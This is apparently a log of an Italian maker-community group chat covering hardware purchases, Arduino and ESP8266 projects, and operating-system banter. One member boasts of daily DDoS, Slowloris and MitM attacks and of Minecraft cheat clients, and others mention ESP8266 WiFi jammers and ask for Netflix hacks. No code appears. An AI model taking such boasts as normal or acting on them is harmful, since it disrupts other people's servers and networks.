Ah certo la vado a prendere, aspetta che l'ho nascosta sotto il letto
Vai vai
Che se non esce così non so proprio che fare
da quanto ho letto non è proprio così
il primo è l'argento
Ah si mi sono sbagliato
Aspe
parlando sempre di metalli puri eh
Ma non era il primo conduttore di calore? 🤔
No perché ero in vacanza al mare
E la presa non era la mia
O di elettricità?
è possibile che sia entrambi
Okok
Allora tutti ad aprire prese con pinze d'argento
Affitto?
Anche tu hai la fortuna come la mia da come vedo
Eh
E ovviamente senza cose per fare cose
Aaaaaafito
Niente pinze, cacciaviti, martelli...
Boh avresti fatto pochi danni
Cit.
Mi hanno spaccato letti, mobili etc xD
Ma seriamente, usare un magnete? xD
Dici che funziona?
E ovviamente il negozio più vicino dove comprare un caricabatterie nuovo era a qualche km
Uhm... Io staccherei prima la corrente
Eccolo il vero problema
Io ho il supermercato a qualche kilometro 
E che la presa accanto al letto era inutilizzabile
Già ce ne erano due nella stanza
Lo copri per metà di nastro isolante(ma 
 nastro isolante) avvicini e tiri
Costano i punti presa xD
Ma se a un adattatore da attaccare al muro gli metto uno "sdoppiatore usb" (non mi viene la parola) e ci attacco più telefoni si rovina?
Vabeh raga io vado che sono le 23:15 xD
Notte
Le ore piccole
Secondo me conviene cambiare la presa
Io uso questo
se spedisco a  qualcuno i miei sonoff me li mette con tasmota?
mi sto auto-decelebrando
ci sono i video di marco molto chiari
E fu così che YouTube diventò un sito d'incontri
FlirTube

Raga cos'è un DNS? Vediamo se lo dite giusto senza cercare su Google.
Domain name server
Easy
A cosa serve intendevo
Ah
Se non sbaglio sono degli indirizzi che fanno da tramite, ovvero fanno da collegamento tra il server e il dominio
Forse 
Non mi ricordo
Nope, sono dei server che trasformano gli IP tipo (Sparo a caso) 
 in 
Dicendola velocemente
Ah dai su per giù ci stavo 
Sono una serie di lettere con un dominio finale che hanno lo scopo di collegare un ip numerico a queste lettere
Circa
È il contrario
Spiegato malissimo
Eh si
Risolvono i domini in indirizzi IP
se la vedi lato utente viceversa, nel senso che tu chiedi il nome 'ricordabile' e ti restituisce quello difficile da ricordare 
Anche numeri per carità
Cit overVolt
Hahaha
Scusate ma sono fritto xD. Io faccio attacchi Slowloris, Mitm e cose simili
Scontato a 40€ 


Quasi quasi lo prendo
Non male
Costa 160€
Bel Case
Se ci metti dei Led potrebbe uscire molto bello
._. che stiamo a scuola prof?
Lascia stare
No è che a me risulta essere una community di makers e non una classe dell'informatico... Poi fai tu
Era per scrivere qualcosa
Non per altro
Se vuoi sapere cos'è è un altro conto, e te lo spiego volentieri
.__.
Tranquillo só cos'è. È che non trovo gruppi seri di hacking
Trovo gruppi che spammano minkiate e basta, almeno questo no
Gruppi di hacking? Che tipo di hacking?
Da programmazzione a attacchi, virus e cose simili
Non capisco perché alla gente piaccia tanto sta roba ma ook
È molto interessante
Interessante un conto, ma ad esempio io una volta che so come funziona una falla non mi metto a programmare qualcosa che la sfrutti
Non devo mica fare Exploit
Fossi al posto tuo con la testa che serve x fare hacking farei piuttosto una bella cash machine (un bel servizio legale che funziona e va alla grande) e passerei il resto della vita a programmare in spiaggia 
No, sono troppo spericolato per farlo, faccio circa 15 Ddos al giorno per toglermi il medico di torno
Cos
Ci sei rimasto male?
Ah allora devo ringraziare te se Switchando non sta ricevendo update da tempo
Nope
Non per DDoS ai server di Switchando, visto che ormai sono protetti
Ma perché grazie a voi devo perdere tempo e soldi per creare delle protezioni decenti
Io di ddos ne ho vissuto solo uno che ha tirato giù per due giorni un servizio utile e dopo che ho visto lo sbattimento di persone oneste che si sono passate ore a usare lavatrici e cose varie per ripulire il tutto, con l'ansia che un business che dava da mangiare a delle persone andasse a rotoli, ti assicuro che spero di non vederne mai più 
Per fortuna
Guarda, non so se conosci il videogioco Minecraft
Ma io con il Ddos mi diverto e basta, faccio andare off le persone, server e cose inutili
sì
Certo, hackero troppo e tiro giú certi server con ProClient che jratta il server
Io sono stato e sono si nuovo da poco un server admin, tu non hai idea di cosa c'è dietro (riguardo i DDoS)
definisci 'inutili'
Ah quindi è grazie a te che sto lavorando ad un anticheat da una settimana tipo
Inutili tipo siti web che sono innattivi da 8 anni per esempio
Quella è una protezione che vuoi tu, se vuoi ti posso aiutare per PenTest
Ringraziami che non ho il potere di bannare qua dentro e soprattutto che non ho i tuoi dati.
Ok...
Mica sono venuto a distruggerti il server, ricordo
Stai tra ci penso io
Sta venendo un anticheat da paura
Ok, tranquillo
Manco il tempo di killare uno con la killaura che parte il ban
Che hosting usi?
Non l'ho scelto io visto che i server non li pago io, rhosting.
Vps o dedicato
Nel mio vecchio server usavo OVH e pagavo tutto io
Ah ok
A me Ovh fa schifo poi non só per te
Se sono tra i più conosciuti al mondo ci sarà un motivo
Ma preferisco qualcosa di Americano
Sono professionali, mai problemi e i server vanno alla grande
Perché noi giustamente facciamo un server EU e prendiamo una macchina in America
Tanto per far avere un ping medio di 120ms a tutti
Io sono abituato ad avere macchine da guerra non trappole
Non un i3 scassato
Infatti abbiamo un i7 8700k
Io preferisco Amd poi sono gusti
Per Minecraft / gaming in generale?
No, di Cpu e Apu
Schede video Nvidia
Ma che c'entra non stavamo parlando di server?
Vabbè
Pure a me piace di più Ryzen, ma senza dubbio un processore Intel spinge di più su un server da gioco
Comunque secondo me AMD lavora meglio
Forse perchè ho sempre avuto Intel e poi ho cambiato a Ryzen e mi sono innamorato di Amd
Intel da solamente problemi
Sulle macchine che ho usato intel
Prova a liberare un po' di spazio con CCleaner.
Ccleanear == cancer
True
tu sei un po' da iGNUranza però eh
sì ma su dei server che processori AMD vuoi utilizzare?
Non un po', diciamo che uno screen non glielo nega nessuno xD
I ryzen xeon 
che alimentatore modulare mi consigliate per un pc da 500w?
Un PSU 
ok grazie
intendo il modello
un alimentatore modulare da 500w? Quindi ti interessa sapere quale marca?
un modello
mi trovo bene con un RM1000x Corsair, lo uso da un anno, usato con sistema SLI GTX1080
mi viene da consigliarti la marca
ok
c'è ne sono una miriade
attenzione che alcuni scrivono modulare ( ma poi specificano che sono semimodulari)
altri invece completamente modulari
Evga b3 550
ok grazie
Oppure se vuoi spendere di più e avere dio nel PC puoi prendere il 550 g3
ok grazie
Ragazzi, a caso mandate una la configurazione più costosa che vi viene in mente
Però conta che già il b3 ha il ripple praticamente inesistente, riesce ad arrivare a 550w precisi senza drop sulla 12v e ha una curva di efficienza simile a quella degli 80plus gold
Oltre alla modalità eco che rende passivo l'alimentatore a basso carico
Perché?
Boh xD
Per vedere a quanto arriviamo di costo xD
Spendere tanto non significa sempre spendere bene i soldi
Lo so, ma è una cosa per curiosità, per vedere quanto può arrivare a costare
Poi oggi è facilissimo spendere tanto 
Con le RAM e le gpu che costano un fottio
Appunto
 ho fatto un Bot con python... funziona perfettamente all'inizio, ma se lascio il Bot aperto per tanto tempo e provo a mandargli un comando questo risponde dopo tanto tempo (pure 5 minuti) come potrei risolvere?🤔
Se proprio ci tieni
Un PC con i9 sli di gtx 1080ti(anzi di titan xp) 
Raid  di 6 860pro  da 2tb e le altre componenti top di gamma
Arriveresti a spendere anche 8000€
l'anno scorso in questi periodi 2 gtx 1080 500€ UNA 🤣
Adesso 1000€ l'una
comprai le versioni Bulk senza manuali e senza scatolo
può andare come primo pc per modellare in 3D e un po' di gaming?
è  deformata
Dove lo hosti?
È in esecuzione su un raspberry pi 3
Si legge solo il prezzo
Ah uhm...
E c'è tutta questa robaccia 
Se passa troppo tempo compare questo
Come è che fai?
Connection time out
A 195€ non ti conviene prendere la GTX 1050 ti?
E un ssd m.2?
Aiuto
Ho delle cuffie con attacco type c
E le devo mettere sul huawai p10 lite che ha solo il jack per connessione cuffie
Esiste qualche adattatore?
Da type-c femmina a jack maschio
se metto 2 condensatori in serie qual'è la capacità?
L'inverso della capacità è la somma degli investimenti delle capacità
non ho capito, c'è se io ho un condesatore con capacità 5 e uno con 10 se li metto in serie che capacità ho
Spero che tu non abbia davvero condensatori da 10 Farad
era un esempio grazie
Sisi hahaha tranquillo
Ma la coerenza di Argo Scuolanext? Mi fa settare: ingresso in ritardo in 
 alle ore 
.
 va perfetto il pc....
CHE
CULO
ASSURDO
Come fa a funzionare?
Non ho idea
Hai venduto l'anima al diavolo?
Anche perché era in standby
Non spento
Quindi il braccetto dell'HDD facilmente era sul disco
Una sana botta di fortuna dai
Lo schermo e tutto il resto funziona?
Ma sì ma lo schermo può anche morirci
Se si rompeva l'harddisk mi toccava buttare centinaia di sbleuri a trovare qualcuno che lo salvasse
Non ho manco guardato se si sono rotte plastiche ma facilmente sì, col volo che ha fatto 
non c'era al 100%. Si parcheggia sempre.
Credevo che la collera avesse preso il sopravvento!!!!
Ho appena lanciato il mio PC
Non sono ancora così Casey 
Varrà la pena?
Pensa in quel modo oltre al fisso nuovo anche il portatile
Che si lamenta sempre ma è 1000 volte meglio del mio
Sei messo male allora
Già
⁣Case da Gaming Thermaltake View
Prenotabile a soli €52,80 invece di €116,90


I riflessi

  per te merita a questa cifra? Sono perplesso
O tanto vale prendere questo 


Mmmm diciamo che vedendolo in azione non mi piace troppo l'a1
Perché?
E il redmi 4 dall europa?
Fotocamera, troppo grosso, non è chissà quanto rapido rispetto ad esempio al mi 5x
Non so che cellulare prendere ahahahah
Il redmi note 5
Come dimensioni siamo lì
Ma non il plus?
Il redmi 5 plus costa di meno
Ma il note è mejo
Ma è quello nuovo non ci capisco niente con i loro nomi ahhs
Allora aspetto qualche mese che esca la global
Ma non è meglio il mi a1 a 187 rispetto al plus 64gba 200, che marco ha messo tra  le offerte? XD
Mm sono uguali dentro... Entrambi 4gb ram, 64gb memoria, il 625...
Benvenuto!
Quando mando un comando dopo tanto tempo il Bot ci mette alcune volte anche 5 Min a rispondere
Oppure compare quell'errore e non risponde proprio
Eh si ma come è fatto il bot
Ah fra un po' mando qualche foto
A volte capita, prova a riavviare modem, bot e raspberry
se non funziona devi solo aspettare 1/2 giorni, problema del server
oppure prova a creare un nuovo bot, da 
Potrebbe essere nel while? Dovrei forse aggiornare la connessione in qualche modo?
C'è un unica funzione che gestisce la risposta del Bot cmq
prova a mettere sleep(1) nel while, ma non è quello
^
Riproverò vediamo che succede...
Revoca il token
Perché?
Sei strano
Quando scopri che anche 
 sta impazzendo con Instagram...
Tiro un sospiro di sollievo
Boh prova... A me ha funzionato un paio di volte
Mi A1 come ho fatto io
Ok vi farò sapere
è un link senza sponsor
tranquilli
volevo sapere un opinione dagli esperti
Ti ho voluto bene powerbank da 10A finchè è durato
A beh, a quanto pare non era waterproof come diceva la confezione ._.
L'intero circuito è pieno di..robba...causata dall'acqua
E una usb è bruciata non si sa perchè...però ha sempre funzionato🤔🤔🤔
Un odio guarda...
Also, quando il litio brucia non lo spegni neanche con l'estintore.. Quindi occhio 
oppure faccio finta di nulla e la riutilizzo, sembra funzionare ancora. 10A sono tanto per una cosuccia che pesa così poco, mica li butto bruciati, mo' se vedo che ancora va la uso per qualche bel progettino
beh però la fiamma rossa è bella da vedere
beh anche
comunque sto tentando di distagnare il pannello solare, ho il saldatore a 400° e sta cosa non sta cedendo neanche un po', 

Ah, mi fa piacere
Tutto lo stagno che ho dissaldato pesa 78g, wow
Esiste un macchinario che crea i filamenti? 
non penso sia economico
Peccato
magari prendi una scatola di metallo ci fai un foro e da sopra sciogli con un fiamma ossidrica lo stagno facendolo cadere a filo
Però credo che esca a gocce
Nono non usano stagno
uuuhh dissaldato...ho solo dovuto alzare un pelo la temperatura, manco fosse piombo 100%
Quando ho cambiato il connettore alla batteria del drone ho tagliato un pezzetto di cavi e bom
Avevo troppa paura del litio io 
Ma perché esplode? A contatto con l'aria?
pure io, mentre dissaldavo il negativo di colpo si è accesa una lucetta verde, sono saltato indietro però ce l'ho fatta, dai, non ho neanche sfiorato la batteria
Penso di sì... Però se lo scaldi a 60000000°C non penso se ne stia lì tranquillo ad aspettare
Benvenuto!

il blocco nero dove entrano i cavi fa parte della batteria? sembra strano, credo ci sia un circuitino o qualcosa dentro
opporc, sotto la batteria c'è 1 litro di acqua
si di solito c'è un circuito per evitare penso eslosioni o cose simili per overcharging o per evitare il danneggiato per l'overdischarging
uu bellino
Io odio gli hashtag in questo momento.. non c'è verso di farli funzionare correttamente
credo sia incollata con della attack sotto
Praticamente ho preso su da terra lo zaino "con un discreto brio", non accorgendomi che la tasca principale era aperta... E il computer che era dentro è stato lanciato che manco il Falcon9 di Elon Musk  Non ho il coraggio di accenderlo
mi è successa la stessa cosa al catechismo
in chiesa
un po' di tempo fa però
ok va tutto, mi diverto ora
e dopo quella bestemmia il prete ti bannò a vita
anche se domani mi farò la cresima 
Riusciresti a mandarmi i link in privato di Amazon?
Posso usare questo e ci metto tasmota?
Decisamente
In modo da controllarlo da switchando
Di cosa?
Dei componenti che mi servono
Dimmi che vuoi che ci sia (porte, luci cancelli ecc...)
Mah, con un Raspberry e Python avresti risolto subito
Luci (10 pcs) ho già i led
Arduino (ne ho solo 1)
Motore per cancello
Sensori di movimento
WeMos D1
E lo dico perché ho un Arduino e un ESP a casa, e so la loro scomodità per fare domotica
8266?
...12E
È difficile lavorare ad un Web Server (libreria ESP8266WebServer) con un linguaggio talmente a basso livello come il C
Dovrei fare anche un mini-impianto di irrigazione. Lo so sono pazzo...
quando ti rendi conto che il tuo video è primo risultato della ricerca google 


Like this
Si
Ma cosa vuoi utilizzare, il Wi-Fi oppure il Bluetooth?
Non so se farla l’irrigazione
Non cambia
Se vuoi creare un'interfaccia Wi-Fi, scordati le pagine con molto CSS
Vabbeh
A me basta on off
Anche se il protocollo Bluetooth è più difficile da implementare per tutti i dispositivi
Farei Wi-Fi
Ho una cosa del genere sul libro di STA
Ah, allora va bene
scrivimi questa sera
C'è anche il codice
Ci ho fatto uno sketch l'altro giorno
Ah
Basta andare su 
Io?
Yes
Verso che ora?
Ok ma sono limitato
Non posso scrivere anche se 
 mi dice così
cmq sto pannelletto solare è una figata, esce 200mA di corrente a 5V di tensione, dovrebbe bastare per accendere un arduino
Finalmente uno che dice Arduino al posto di Arduini
LoL
Buone notizie, al momento non esiste alcuna limitazione sul tuo account. Sei libero come l'aria!
Eppure
scherzonissimo, addirittura 500mA di corrente a 5V di tensione, è potentissimo sto coso
2.5W
c'è praticamente è l'uscita di una usb 2.0 a massimo carico
Povera usb
Si fonde
Che bello flashare i sonoff come se fosse burro
È una cosa impressionante
Se attacco Arduino ai 220 esplode?
gente ma se dovessi accendere un arduino con i pin, quali pin devo usare?
oppure per forza via usb?
cosa, non capisco
Via usb o via cavo con batteria
Non puoi
Se non vuoi fondere Arduino alimentalo con usb
mmmhhh...ok, allora devo trovare un piccolo cavetto micro usb, poi gli attacco positivo e negativo al pannello solare
Ehm no. Ci sono i cavi da batteria 5V a ingresso di Arduino
si, questo pannello fornisce esattamente 5v
5pcs DC 9V Batteria Bottone Cavo di Alimentazione Linea Privata per Arduinohttps://banggood.app.link/uwJWAoPBTL
e anche la quantità di corrente è esattamente quella che gli serve
Asp
noooohhh, io ho un arduino leonardo pro micro, non un uno
si connette sulla micro usb
Ah
Ok
Puoi collegarlo con la micro usb
si ok attacco la micro usb al pannello solare, quello dicevo
Solo che devi fare attenzione ai cavi.
si ovvioh
Si puoi ma stai attento a non beccare i cavi di trasmissione dati
speravo solo ci fosse un'altra soluzione :/
beh si, tranqui, so come è fatta
Credo di no. I pin che ci sono sull’arduino sono in output credo
già, non c'è un VIN, per quello chiedevo
Ah okk
Comunque per cosa ti serve alimentarlo da pannello solare? 
giusto perchè fa figo
poi probabilmente farò un piccolo progettino e non ho voglia di avere 99 batterie a bordo
al massimo gli metto una modalità di protezione sul rasp che dice "se l'arduino è morto, aspetta 3 secondi, se è ancora morto, allora liberatene"
nel caso ci fosse troppa poca luce e si spegnesse
magari con una fotoresistenza, la metto su e gli dico "hey, se la corrente passa attraverso allora switcha dal pannelletto alla batteria" e poi mi inventerò un circuitino decente
Puoi anche fare così:
Fotoresistena: se passa poca corrente intervieni con la batteria
Fotoresistenza: se passa sufficiente corrente usa il pannello
se ho un provlenancon un prodotto comprato su amazon (ancora in garanzia) devo contattare il venditore o amazon?
Chi vuoi, io ti consiglio Amazon
ok perfetto perché avevo scritto al venditore e mi ha risposto ma, tra le righe mi hanfatto capire una cosa tipo ti attacchi
 something to say?
gli Epyc..sono favolosi
il nuovo Sharkoon è eccellente (testato da Falco)
il nuovo EVGA B3 è eccellente, ha il ripple più basso che abbia mai visto negli ultimi 5-10 anni (piattaforma SuperFlower e Seasonic )
Case pessimo (a quel prezzo trovi mooolto meglio, fidati)..Ventole pessime anche (allo stesso prezzo compri delle Noctua oppure delle BeQuiet)..idem AIO (se proprio vuoi prenderne uno, vai di Corsair oppure DeepCool) e HDD (Seagate manco a parlarne, se vuoi affidabilità vai direttamente su Hitachi oppure meglio ancora HGST)
è il momento di investire in un NAS..decisamente
infatti si usa la sabbia..mai usare schiumogeni con il litio
si incendia a contatto con l'ossigeno, e non vanno assolutamente usati estintori schiumogeni..solamente anidride o meglio ancora sabbia
solitamente è quasi impoassibile da spegnere..infatti la procedura è cercare di contenere l'incendio con i ritardanti di fiamma e farlo estinguere da solo
Quando scopri che non brucia il litio in se ma l'idrogeno xD
Mi sa che tocca cambiare telefono prima dell'estate
Fino a 90 va bene tranquillo
O cambiare rom
Lì è il kernel
La stock lo fa riavviare per overheating
alle mie mani no.
LoL
Il mio iPhone 3GS scalda di meno...
Renditi conto che lo sto tenendo in mano con due dita per quant'è fastidioso
Usando la vecccia versione di real reacing va sui 40 gradi
Che cell è?
Non ha un Exynos7420
Conosciuto come il peggior processore che Samsung abbia mai creato
No, i7-8700K ahahhahha
Che cell è?
ti diverti a prendere i peggiori cell in commercio?
Se ti dico 7420... Ce n'è uno solo ed è S6
LoL
Trasferirsi in una cella frigorifera non è una cattiva idea
Così la batteria muore ancora più velocemente
basta tenerla sul termosifone così entra in temperatura prima
posso scriverti in privato?
certo
che app è?
CPU-Z
ci sono arrivato dopo
so che aiuta alla salute
Ccccoooooossssss
Mettilo sul canale, è un'offertona forse errore di prezzo 
Se lo leggi poi cancello almeno metti il referral tuo🤣
Thx
 nulla, so che ai fotografici può servire
Qualcuno che mi da una mano con la config del mio pc
Cosa?
??
Credo ti trascriva il messaggio vocale 🤣
Si ma trascrive come gli pare
Ti serve il sonoff pow
Quello che regge molto POWer
funziona bene
220V 16A quindi circa 3000W
Raga sapete come si connettono i fori dei componenti alla cooper area su easyeda
?
Ma a cosa serve la copper area? Non l'ho mai capito
Ti riempie le zone vuote del circuito con una pista riempitiva che puoi utilizzare per distribuire un segnale che viene ripetuto in molti punti del circuito tipo vcc e gnd
Ragazzi posso abbinare un telecomando al sonoff: voglio accendere e spegnere la luce della stanza utilizzando un telecomando. Se si, quale? (a swtichando)
Ciao a tutti, qualcuno ha familiarità con i NodeMCU versione ESP12 tipo questo?

Ho provato a programmarlo utilizzando la libreria blynk ma mi si disconnette dopo pochi secondi! 
Ragazzi posso abbinare un telecomando al sonoff: voglio accendere e spegnere la luce della stanza utilizzando un telecomando. Se si, quale? (a swtichando)
non ti so aiutare.
ragazzi, mi consigliate di attivare S.M.A.R.T su un registratore di videosorveglianza (ha un HDD da 500GB)
Ma sul canale di overvolt non c’era un video sugli infrarossi e arduino?
mai visto
infrarossi? nope 🤔
l'unica cosa infrarossi è il sensore di fiamma
Facile:
Mac pro, 4000€ di pura merda
Quelli nuovi sono meglio
Quotissimo
Processore quantico
Freezer buono
Schermo 54/9
Mouse , tastiera cuffie e robe fai tu
Ahahahahah
Risparmi sulla scheda video
La CPU quantica regge tipo un trlilione di calcoli al secondo
E sulla ram
Proviamo?
A averla 
Dovrei essere un po' più ricco 
Lo ha mio padre
Solo per tenere acceso tipo 30kw di freezer per stare a 0k (Kelvin)
Mi sei piaciuto
mio padre ha l'imac pro
Nuovo slogan : "il cestino più costoso di sempre"
Meglio ancora:
"Thrash differently"
Guys sera
Proponete film da vedere stasera, dai hahha
Nerve
Madonna che rompicoglioni che siete...
magari non l’hai nemmeno mai provato!
Sei come gli estremisti religiosi che siano quesi Cristiani musulmani 
Non sei meglio di Apple fan boy
Però critichi perchè va di moda!
Tanto te che pc hai?
Un monitor hp con Windows vista?
Ma anche se avessi elementary o che ne so non potresti rompere le palle così
soprattutto perchè iOs manco l'hai mai provato!
Bhe scusa ma tu invece? Guarda che su quello mica ci gira iOS, al massimo MacOS
infatti non ho condiviso la foto solo per fare il cazzone
non lo conosco
non l'ho mai provato
sto zitto sull'argomento.
mr robot 382 puntate di fila

Lo sapete che fra poco chiuderà 
 ????
Ohi, calma gente
Ho visto la prima e la seconda season
Peccato
Ci sarà un motivo se tutto il mondo dice che per fare qualcosina in più con iOS non si può 
E comunque sono il primo che dico che i prodotti Apple durano più di qualunque altri
Ma preferisco altri 
Avete altri film da consigliare?
Ma l’opinione di tutto il mondo coincide sempre con la tua?
Eh se la gente è più esperta di me cerco di capire le motivazioni
E in questo caso in effetti 
Io per esempio sul pc uso qualche app che su iOS non potrei usare
Ma sto dicendo che dipende da quello che devi fare
Se ti serve per lavorare mi fa più simpatia Apple perché non morirà mai quel pc
rip allora
Ma se ti serve per qualcosa di particolare la vedo difficile che vada bene
Quel PC è vecchio
Buh quello in particolare non lo conosco
Ma costando 4000 euro magari ne vale 1000 sempre buono è
raga, fatto per la prima volta i baffi 
eh
?
Beh ma tranquillo eh, le opinioni degli altri sono pur sempre opinioni e vanno rispettate, altrimenti per gli insulti passa pure al flame ma non farti domande sul perché ti bannino
Ed il TV-b-gone
Si parla di un'opinione mia, con la quale ho affermato che "composizione pc più costose" e prodotti "merda" (è vero che qui il treccani mi frega e avrei dovuto portare qualche tesi a favore ma insomma, non siamo alla crusca) per me combacino con un mac pro a 4000€, se vuoi possiamo tranquillamente discuterne sul perché, ma agli insulti non rispondo
 attendo risposta
*è ironico*
Io no
Calmatevi 
Tranquillo, l'età media è abbastanza alta da evitare discorsi "xd ho ragionne yooo!!1"
NNNOOOO COS 
Sicuramente perché chi ha elementary deve bruciare all'inferno
yup
cosa?
erdaaaa
^
che signifia la tua frase? 
fatto per la prima volta i baffi

Intendeva i linux fag, anche se in ogni caso una volta arrivati al fag il purgatorio è già distante
Chi ha elementary non è un Linux fag, è un Apple fag senza soldi che si crede un Linux fag
Ahahah scusa ma 
 non posso non taggarti
carissimi makers, sapete come si può cambiare colore?
Soffoca
che carpa di tastiera è???
Dimmi cosa centra anche solo lontanamente elementary con la robba di apple
bho
spiegami il collegamento tra Apple ed Elementary che non l'ho capito 
LG g11 credo
È letteralmente una carpa con dei tasti mi sa
la aveva mio padre
di quanti secoli fa?
bho
^
almeno 548953 ok
Ma il colore del pavimento?
però è carina
marrone
Ce ne ho una molto simile ma nera da qualche parte, sono una figata, scegli il volume del pc da li
appunto
regalo della cresima di mio padre
una tastiera?
siii
Elementary non viene scelto per le prestazioni, né per il minimalismo, né per la sua base (per carità), bensì perché è bbbello
Suo padre è patito informatico
comunque vista l'età non credo si possa cambiare colore a meno che non la apri e gli cambi tutti i led 
Practically il ragionamento dell'80% dei Mac userzz
mhhh.... giusto
e chi te lo dice? Anche Deepin è bello se per questo
Mmmhh...si...ok...io lo uso anche perchè non mi da problemi con un po' di programmi comunque si...e quindi?
L'altro 20% sono scemi autolesionisti che si vogliono fare male e basta
MA è cinese e closed source
Quindi bho
mmm wait... ha anche dei lati positivi un Mac
pensa il dover portare a scuola un pc che sia performante e pesi poco: il mac è l'unico che ci riesce benissimo
Gli altri 20 sono sviluppatori che vogliono stabilità, o sviluppano per iOS
Voglio dire...è fatto bene, a me piace non solo per la grafica ma proprio per come funziona, non è l'unico ma ci sta, mica lo usano tutti solo perchè è bellino...e anche se fosse poi...
per tutto il resto preferisco anch'io Windows per la produttività e Linux per il resto
Guarda che elementary è ubuntu con qualche libreria per le iconcine stilose eh
Non puoi confrontare gli eppol fegh con chi usa elementary...prima di tutto perchè il solo essere riusciti ad installarlo simostra le maggiori capacità mentali
Ma non ci vuole nulla ad installare elementary 
Chiedi ad un eppol fegh di installare un qualsiasi sistema operativo, anche winzoz
Vedi cosa ti risponde
Ti chiede come si installano i file .iso
cos'è*
Sattoh
Scusami, ma se ti paragoni a gente più stupida di te risulterai sempre un genio
Sei tu che hai paragonato chi usa elementary agli eppol fegh, mica io
Chissà perché..
Ma serio?
Ma cosa vuol dire, ti stai contraddicendo con il tuo stesso precedente messaggio
E che c'hanno i soldi per pagarsi i permessi Developer
Come si fa ad impostare il layout italiano nella tastiera di arduino?
Quando si fa 
 keyboard.h
Qualcuno ha mai usato la spedizione expedited shipping service di banggood? Quella 5-8giorni
No.. solo quella da 1.50/2€
Qualcuno sa se esiste un sensore di trazione o compressione?
Dentro le bilancie xD
Sei un GENIO
"bilancie" mi ha steso
Sennò non fa ridere
Io
Dimmi
È tracciabile?
Nessuno nessuno?? 
Io lo usavo  come jammer, poi l'ho bruciato e sto aspettando il sostituto
No... c'era anche quello per spegnere tutte le TV, era hacking però
che adesso è sul blog
Io uso nodeMcu esp8266 ma non ho dimestichezza
LOL continuo a sbagliare link
Sempre usando il progetto che si trova su GitHub?
Sì anche io ne ho uno che fa da jammer WiFi e funziona...ma altri 2 ( e lo stesso che poi ho usato come jammer) non tengono la connessione 
Si, però l'ho flashato tramite Arduino ide
Mi sa che ho qualcosa che non va
Si
eeh avevo scritto "
"
Ci ho provato anche io ma non ha funzionato
Ho proprio sbagliato qualcosa nel procedimento penso
A me non funzionavano gli alti metodi,
ho una domanda, nelle equazioni posso fare lanradice da entrambe le parti?
Ah ok
Ahahah
Io avevo trovato un video in una lingua strana (tipo indiano)
Mi piacerebbe un sacco ma proprio non capisco cosa io stia sbagliando
Ahahahaha
Che spiegava il procedimento??
Io ho trovato solo video presentazione 
Nessuno che spiegasse
Erano un bel po' di passaggi, prima di tutto hai selezionato sull'ide il dispositivo giusto? Non so come si chiami ma ricordo bene che si deve usare la versione 1.0
Si sì
Il progetto che seguivo io
Trovato su github
Richiedeva la versione 2.0.0
si
Non mi ha dato il numero
ah a me lo da
Che posso fare di bello con 3 Arduini mega??
Vabbè troverò il modo di averlo... Mica per caso hai beccato la dogana?
Li ho appoggiato l'uno sull'altro e sa troppo di cluster pc
Non si può fare una cosa del genere vero??
l'ho beccata una sola volta solo che dopo ho contattato  banggood , si sono scusati e mi hanno regalato "l'anti-dogana" su tutti gli ordini.
Bello... Spero di non beccarla 
ti rimborsano e ti mandano il prodotto con la spedizione di meno giorni possibili
Ma scusa... Se mi rimborsano è perché la pago... E se la pago il pacco arriva comunque velocemente... Quindi cosa mi mandano? 
Ripropongo: come si imposta il layout italiano quando si fa 
 keyboard?
hack per netflix ne conoscete?
 xhi ti ricorda? 
giente, help
mi dice che non sono dichiarate quando fuori dal loop ci sono
non è python
nope, arduino
public nome
hai dimenticato qualche libreria?
ehm... su Arduino il codice fuori dal loop è pubblico a prescindere
nope, le librerie ci sono
uuuk
chiedi sul forum di 
compilandolo con l'IDE sul pc funziona senza errori, Make mi dice che non sono dichiarate
 vero che stai facendo il tuo dovere?
quando vuoi rendere un gruppo più ignorante di quello che già è
(ho messo i due puntini al nome solo per far cambiare la propic in una faccina sorridente)
Il surface? Un tablet con tastiera? Un portatile come gli yoga? Quest'ultimo la mia prof di fisica lo ha ed è spettacolare
Si fa tranquillamente anche 5 o 6 ore in autonomia, compatto e PURA PUTEEENZA
hai ragione
Lenovo > *
che non costi tropp... ah no
Meno di un macbook, ti risparmi giusto quei 3000€ in più aggiunti per la touchbar
Ma mi raccomando: "think diffrently"
infatti quell'"ah no" era proprio per quello 
sattoh
: 

visto
Ed è di 5 anni fa
I nuovi pesano 1kg
COSA CASEY IN LIVE?
si
hahhahah
Ahahah già
Era nella descrizione dell'ultimo vlog, peccato che non ha detto nulla a voce
Si ma devi capire che io sono troppo indietro coi suoi video
BRUTTA COSA
Adesso sono partito in overdose, ne ho visti 6 ieri sera e 5 stamattina ma mi devo riportare in pari
Ah vabbè per quello che l'ho Vista io parlava di cose a random
Si ma è casey  io fangirlo troppo
Fangirl cos
Fanboy AHAHAHHA
Eh no è unisex: voce del verbo fangirlare
è riccoh
Ni, parliamone..se mi dici che durano più dei vari Acer, Asus, HP, Lenovo, allora si..ma già se li confronti con altri marchi di pari livello qualitativo e di assistenza, come Dell (Latitude, Inspiron, XPS), Santech, Thinkpad, Clevo, beh non ne escono tanto bene i cari Apple
che razza di tastiera è? mai vista
Qualcuno sa come si mangia una papaya? 🤔
Dopo questa Il mio prof di italiano si è appena sparato in testa
Dell XPS, HP X360 (per quanto io odi HP), Asus Zenbook, LG Gram
No, hp no
Dell e Asus assolutamente sì
tu dare budget me Pesavento, io trovare portatile  spaco botilia amazzo prof
Dopo aver compilato il doodle

"Makers ITA, un gruppo dove condividere progett.. ehm"
concordo..io uso solamente roba buona..Thinkpad, Dell, Santech, Asus..altri spacciatori di hardware non ne entrano a casa mia 
Non ne ho la più pallida idea, ma credo a fette
"io uso solo roba buona" morto ahahahahahah
Sembra lo spacciatore di sotto casa 

Looool
Google non aiuta

Ahahahahah
chiedi a 
, il suo portatile Thinkpad gliel'ho consigliato io 
Oh si mangia o a fette o con il cucchiaino....provate
"Come pulire e tagliare la papaya
Sicuramente chi non ha mai pulito la papaya non saprà da dove cominciare ma quest’operazione è davvero molto semplice.

Per pulire e tagliare la papaya vi servirà un coltello affilato, un tagliere, un cucchiaio.

Fase 1. Con il coltello eliminate la buccia facendo attenzione a non rovinare la polpa.

Fase 2. Sciacquate il frutto con acqua corrente, fredda, ed asciugatelo con della carta assorbente.

Fase 3. A questo punto utilizzate il tagliere per stendere su la papaya e dividerla a metà.

Fase 4. Rimuovete tutti i semini, che troverete al centro del frutto, utilizzando il cucchiaio. Nel caso siano rimasti dei filamenti provvedete a rimuovere anch’essi.

